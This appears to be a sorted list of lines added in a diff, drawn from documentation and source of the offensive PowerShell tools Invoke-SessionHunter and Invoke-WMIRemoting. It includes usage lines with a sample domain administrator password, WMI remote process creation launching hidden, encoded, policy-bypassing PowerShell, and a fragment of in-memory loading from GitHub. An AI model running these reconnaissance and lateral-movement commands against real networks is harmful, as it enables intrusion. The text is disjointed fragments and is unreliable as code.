@@ -1,0 +1,34 @@
+"Invoke-SessionHunter -CheckAsAdmin -UserName ""ferrari\Administrator"" -Password ""P@ssw0rd!"" -Timeout 5000 -Match"
+"Invoke-SessionHunter -CheckAsAdmin -UserName ""ferrari\Administrator"" -Password ""P@ssw0rd!"""
+"Invoke-SessionHunter -Domain ""contoso.local"" -Servers"
+"Invoke-SessionHunter -Domain ""contoso.local"""
+"Invoke-SessionHunter -Hunt ""Administrator"""
+"Invoke-SessionHunter -Targets ""DC01,Workstation01.contoso.local"""
+"Invoke-SessionHunter is designed to keep your host machine, your current user, and the provided username out of scope. "
+"Invoke-WMIRemoting -ComputerName $Computer -Command ""klist sessions""}"
+"Invoke-WMIRemoting -ComputerName $Computer -UserName $UserName -Password $Password -Command ""klist sessions""}"
+"Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList (""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "" + $finalCommandBase64)}"
+"Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -Credential $cred -ArgumentList (""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "" + $finalCommandBase64)}"
+Invoke-SessionHunter
+Invoke-SessionHunter -CheckAsAdmin
+Invoke-SessionHunter -CheckAsAdmin -Timeout 5000
+Invoke-SessionHunter -Domain contoso.local
+Invoke-SessionHunter -Match
+Invoke-SessionHunter -NoPortScan
+Invoke-SessionHunter -RawResults
+Invoke-SessionHunter -Servers
+Invoke-SessionHunter -ShowAll -IncludeLocalHost
+Invoke-SessionHunter -Targets c:\Users\Public\Documents\targets.txt
+Invoke-SessionHunter -TargetsFile c:\Users\Public\Documents\targets.txt
+Invoke-SessionHunter -Timeout 5000
+Invoke-SessionHunter -Workstations
+Invoke-SessionHunter Author: Rob LP (@L3o4j)
+Invoke-SessionHunter in memory
+Invoke-SessionHunter will skip any target where the remote registry fails to respond within 2000ms (2 seconds).
+Invoke-SessionHunter {
+Invoke-SessionHunter/assets/61951374/0505d8d7-231a-4e3e-b157-58900e7bba85)
+Invoke-SessionHunter/main/Invoke-SessionHunter.ps1')
+Invoke-WMIRemoting
+Invoke-WMIRemoting Author: Rob LP (@L3o4j)
+Invoke-WMIRemoting {
+Invoke-WMIRemoting](https://github.com/Leo4j/Invoke-WMIRemoting) (which most likely will retrieve more results)
